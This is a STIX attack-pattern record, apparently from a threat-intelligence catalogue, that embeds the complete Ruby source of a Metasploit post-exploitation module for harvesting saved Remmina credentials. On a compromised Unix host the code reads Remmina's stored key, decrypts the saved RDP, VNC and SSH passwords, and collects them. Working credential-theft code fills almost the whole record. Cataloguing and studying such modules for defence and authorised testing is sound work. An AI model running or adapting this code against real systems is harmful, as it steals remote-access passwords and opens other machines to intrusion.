{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--045906a1-5e18-45df-b66b-66065bf4c25e",
    "created": "2024-08-14T16:33:19.184875Z",
    "modified": "2024-08-14T16:33:19.184879Z",
    "name": "UNIX Gather Remmina Credentials",
    "description": " Post module to obtain credentials saved for RDP and VNC from Remmina's configuration files. These are encrypted with 3DES using a 256-bit key generated by Remmina which is (by design) stored in (relatively) plain text in a file that must be properly protected.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/remmina_creds.rb",
            "external_id": "remmina_creds.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Unix\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'UNIX Gather Remmina Credentials',\n        'Description' => %q{\n          Post module to obtain credentials saved for RDP and VNC from Remmina's configuration files.\n          These are encrypted with 3DES using a 256-bit key generated by Remmina which is (by design)\n          stored in (relatively) plain text in a file that must be properly protected.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Jon Hart <jon_hart[at]rapid7.com>'],\n        'Platform' => %w[bsd linux osx unix],\n        'SessionTypes' => %w[shell meterpreter]\n      )\n    )\n  end\n\n  def run\n    creds = extract_all_creds\n    creds.uniq!\n    if creds.empty?\n      vprint_status('No Reminna credentials collected')\n    else\n      vprint_good(\"Collected #{creds.size} sets of Remmina credentials\")\n      cred_table = Rex::Text::Table.new(\n        'Header' => 'Remmina Credentials',\n        'Indent' => 1,\n        'Columns' => %w[Host Port Service User Password]\n      )\n\n      creds.each do |cred|\n        cred_table << cred\n        report_credential(cred[3], cred[4])\n      end\n\n      print_line(cred_table.to_s)\n    end\n  end\n\n  def decrypt(secret, data)\n    c = OpenSSL::Cipher.new('des3')\n    c.decrypt\n    key_data = Base64.decode64(secret)\n    # the key is the first 24 bytes of the secret\n    c.key = key_data[0, 24]\n    # the IV is the last 8 bytes of the secret\n    c.iv = key_data[24, 8]\n    # passwords less than 16 characters are padded with nulls\n    c.padding = 0\n    p = c.update(Base64.decode64(data))\n    p << c.final\n    # trim null-padded, < 16 character passwords\n    p.gsub(/\\x00*$/, '')\n  end\n\n  # Extracts all remmina creds found anywhere on the target\n  def extract_all_creds\n    creds = []\n    user_dirs = enum_user_directories\n    if user_dirs.empty?\n      print_error('No user directories found')\n      return creds\n    end\n\n    vprint_status(\"Searching for Remmina creds in #{user_dirs.size} user directories\")\n    # walk through each user directory\n    enum_user_directories.each do |user_dir|\n      remmina_dir = ::File.join(user_dir, '.remmina')\n      pref_file = ::File.join(remmina_dir, 'remmina.pref')\n      next unless file?(pref_file)\n\n      remmina_prefs = get_settings(pref_file)\n      next if remmina_prefs.empty?\n\n      if (secret = remmina_prefs['secret'])\n        vprint_status(\"Extracted secret #{secret} from #{pref_file}\")\n      else\n        print_error(\"No Remmina secret key found in #{pref_file}\")\n        next\n      end\n\n      # look for any  \\d+\\.remmina files which contain the creds\n      cred_files = dir(remmina_dir).map do |entry|\n        ::File.join(remmina_dir, entry) if entry =~ /^\\d+\\.remmina$/\n      end\n      cred_files.compact!\n\n      if cred_files.empty?\n        vprint_status(\"No Remmina credential files in #{remmina_dir}\")\n      else\n        creds |= extract_creds(secret, cred_files)\n      end\n    end\n\n    creds\n  end\n\n  def extract_creds(secret, files)\n    creds = []\n    files.each do |file|\n      settings = get_settings(file)\n      next if settings.empty?\n\n      # get protocol, host, user\n      proto = settings['protocol']\n      host = settings['server']\n      case proto\n      when 'RDP'\n        port = 3389\n        user = settings['username']\n      when 'VNC'\n        port = 5900\n        domain = settings['domain']\n        if domain.blank?\n          user = settings['username']\n        else\n          user = domain + '\\\\' + settings['username']\n        end\n      when 'SFTP', 'SSH'\n        # XXX: in my testing, the box to save SSH passwords was disabled\n        # so this may never work\n        user = settings['ssh_username']\n        port = 22\n      else\n        print_error(\"Unsupported protocol: #{proto}\")\n        next\n      end\n\n      # get the password\n      encrypted_password = settings['password']\n      password = nil\n      unless encrypted_password.blank?\n        password = decrypt(secret, encrypted_password)\n      end\n\n      if host && user && password\n        creds << [ host, port, proto.downcase, user, password ]\n      else\n        missing = []\n        missing << 'host' unless host\n        missing << 'user' unless user\n        missing << 'password' unless password\n        vprint_error(\"No #{missing.join(',')} in #{file}\")\n      end\n    end\n\n    creds\n  end\n\n  # Reads key=value pairs from the specified file, returning them as a Hash of key => value\n  def get_settings(file)\n    settings = {}\n    read_file(file).split(\"\\n\").each do |line|\n      if /^\\s*(?<setting>[^#][^=]+)=(?<value>.*)/ =~ line\n        settings[setting] = value\n      end\n    end\n\n    vprint_error(\"No settings found in #{file}\") if settings.empty?\n    settings\n  end\n\n  def report_credential(user, pass)\n    credential_data = {\n      workspace_id: myworkspace_id,\n      origin_type: :session,\n      session_id: session_db_id,\n      post_reference_name: refname,\n      username: user,\n      private_data: pass,\n      private_type: :password\n    }\n\n    create_credential(credential_data)\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[bsd linux osx unix]"
    ]
}